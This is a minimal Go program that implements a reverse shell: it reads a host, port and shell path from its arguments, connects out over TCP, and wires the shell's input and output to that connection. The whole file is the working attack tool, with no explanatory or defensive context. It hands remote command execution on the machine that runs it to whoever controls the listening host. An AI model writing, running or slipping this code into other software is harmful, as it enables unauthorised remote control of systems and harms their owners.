package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
)

func main() {
	if len(os.Args) != 4 {
		os.Exit(1)
	}

	host := os.Args[1]
	port := os.Args[2]
	shell := os.Args[3]
	address := fmt.Sprintf("%s:%s", host, port)

	conn, _ := net.Dial("tcp", address)

	cmd := exec.Command(shell)

	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	cmd.Run()
}
